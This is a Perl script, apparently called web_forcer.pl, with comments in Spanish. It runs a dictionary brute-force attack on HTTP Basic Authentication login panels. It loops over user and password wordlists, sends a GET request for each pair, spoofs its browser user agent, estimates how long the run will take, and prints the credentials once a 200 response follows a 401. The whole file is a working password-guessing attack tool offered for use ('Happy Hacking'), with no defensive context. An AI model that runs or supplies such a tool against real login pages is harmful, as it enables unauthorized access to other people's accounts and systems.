#!/usr/bin/perl -w
use strict;
use LWP::UserAgent;
use Time::HiRes qw(time);
my $user_agent=new LWP::UserAgent;#Se instancia un LWP, que crea un 'navegador virtual'

############################# MODIFICAR A PARTIR DE AQUI #######################
use constant MAX_SAMPLES => 100;#Muestras a promediar antes de imprimir por pantalla el tiempo que queda. Cuantas mas muestras mas exacta sera la media, pero el tiempo entre impresion e impresion sera tambien mas alto. Ten en cuenta que si este numero es mayor que el total de combinaciones, no se imprimira nada.
my $novalue='novalue';#Palabra que sera sustituida por un campo vacio. Modificala si quieres usar otra en tus diccionarios.
use constant BUFSIZE_USU => 104857600;#Tamaño maximo del buffer EN BYTES. Por defecto son 100 Mb (100*1024*1024 bytes) para el de usuarios, y 500 para el de passwords. Cuanto mayor sea el valor, menos accesos a disco tendra que hacer y mas rapido sera, pero ocupara mas memoria RAM. CUIDADO de NO ocuparla entera con la suma de los 2 buffers.
use constant BUFSIZE_PASS => 524288000;
my $total_comb=1;#numero total de combinaciones. Cuidado con esto. Si se tienen diccionarios muy grandes, mejor desactivarlo. Se desactiva igualandolo a CERO.
$user_agent->agent('Mozilla/5.0 (BeOS; U; Haiku BePC; en-US; rv:1.8.1.21pre) Gecko/20090218 BonEcho/2.0.0.21pre');#Hago que 'parezca' que las peticiones se hacen desde un sistema Haiku (por hacerle un poco de publicidad). Puedes poner lo que te de la gana.
############################ HASTA AQUI. NO TOCAR NADA MAS #####################

print "\nAtaque con diccionario a paneles web de 'login'.\nHappy Hacking :)\nBy wHiTeHand\n\n";

if ($#ARGV!=2) {print "ERROR en los parametros. Uso: web_forcer.pl <URL> <RUTA_DICCIONARIO_USUARIOS> <RUTA_DICCIONARIO_PASSWORDS>\n\nEn los diccionarios (.txt), cada palabra tiene que estar separada de la siguiente por un retorno de carro.\n\n" }

my $buffer;#buffer general
my @a_buf_usu;#array donde se guardaran los datos del buffer de usuarios, con un split
my @a_buf_pass;
my $current;#sirve para saber si el tamaño del buffer es multiplo del tamaño del archivo (en caso de ser menor)
my $temp1='';#Variables temporales, se usan para resolver el problema que surge si, debido al tamaño limitado del buffer, se corta una palabra. temp1 para usuarios, temp2 para contraseñas.
my $temp2='';
my $usuario='';#usuario a procesar
my $req=new HTTP::Request 'GET',$ARGV[0];#Se fija el metodo GET, y la URL objetivo
my $estado;
my $bandera='false';#Sirve para comprobar que la URL sea correcta
my $bandera_comb='true';#Sirve para que solo se ejecute 1 vez el calculo de las combinaciones de usuario.
my $tiempo;
my $tamano_usu;#tamaño del archivo de usuarios
my $tamano_pass;#tamaño del archivo de contraseñas
my $contador=0;
my $tiempo_total=0;

open(DIC_USU,"<$ARGV[1]") || die "No puedo abrir el diccionario de usuarios: $!";
$tamano_usu= -s "$ARGV[1]";
open(DIC_PASS,"<$ARGV[2]") || die "No puedo abrir el diccionario de contraseñas: $!";
$tamano_pass= -s "$ARGV[2]";

print "Procesando...\n\n";

while ($current=read(DIC_USU,$buffer,BUFSIZE_USU)){
    $buffer=$temp1 . $buffer;
    $temp1='';
    if (($current==BUFSIZE_USU) && (substr($buffer,length($buffer)-1) ne "\n")){
	$temp1=substr($buffer, rindex($buffer,"\n",length($buffer)));
	$buffer=substr($buffer,0,(length($buffer)-length($temp1)));
    }
    @a_buf_usu=split(/\n+/,$buffer);
    if (($bandera_comb eq 'true') && ($total_comb!=0)){
	if ($tamano_usu>BUFSIZE_USU){
	    $tamano_usu=int((@a_buf_usu*($tamano_usu/BUFSIZE_USU))+0.5);
	}else{
	    $tamano_usu=@a_buf_usu;
    }
    }

    foreach(@a_buf_usu){
	seek(DIC_PASS,0,0);
	while ($current=read(DIC_PASS,$buffer,BUFSIZE_PASS)){
	    $buffer=$temp2 . $buffer;
	    $temp2='';
	    if (($current==BUFSIZE_PASS) && (substr($buffer,length($buffer)-1) ne "\n")){
		$temp2=substr($buffer, rindex($buffer,"\n",length($buffer)));
		$buffer=substr($buffer,0,(length($buffer)-length($temp2)));
	    }
	    @a_buf_pass=split(/\n+/,$buffer);
	    if (($bandera_comb eq 'true') && ($total_comb!=0)){
		if ($tamano_pass>BUFSIZE_PASS){
		    $tamano_pass=int((@a_buf_pass*($tamano_pass/BUFSIZE_PASS))+0.5);
		}else{
		    $tamano_pass=@a_buf_pass;
		}
		$total_comb=$tamano_pass*$tamano_usu;
	    }
	    $bandera_comb='false';

	    if ($_ eq 'novalue'){$usuario='';}
	    else{$usuario=$_;}
		foreach(@a_buf_pass){
		    if (($usuario ne '') && ($_ ne '')) {
			if ($_ eq 'novalue'){$_='';}
			$req->authorization_basic("$usuario","$_");
			$tiempo=time;
			$estado=$user_agent->request($req)->status_line;#Lanzo la peticion
			
			$tiempo=time-$tiempo;
			$tiempo_total+=$tiempo;
			$contador++;
			if ($contador == MAX_SAMPLES){
			    $tiempo_total=($tiempo_total/$contador);#media aritmetrica
			    print "Velocidad media: ".(1/$tiempo_total)." combinaciones/seg.";
			    if ($total_comb){
				print " Tardara como maximo ".int(($tiempo_total*$total_comb)+0.5)." segundos porque le faltan $total_comb combinaciones por probar.\n";
			    	$total_comb--;
			    }
			    else{print "\n";}
			    $contador=0;
			    $tiempo_total=0;
			}
			if ($estado eq '401 Unauthorized') {$bandera='true';}
			if (($estado eq '200 OK') && ($bandera eq 'true')){
			    print "\nHecho! :D\n\nUsuario: $usuario\nPassword: $_\n\n";
			    apagaaa();
			}elsif($bandera eq 'false'){
			    print "URL INCORRECTA, se esta recibiendo un estado: '$estado', cuando deberia ser '401 Unauthorized'. ¿Te faltara algun parametro? Lo normal es que sean de la forma '<URL>/algo.cgi'. Wireshark puede ayudarte a encontrar la URL correcta. Saliendo...\n\n";
			    apagaaa();
			}
		    }
	    }
	}
    }
}
print "No hubo suerte :(\n\n";
apagaaa();

sub apagaaa{
    close(DIC_USU);
    close(DIC_PASS);
    exit(0);
}
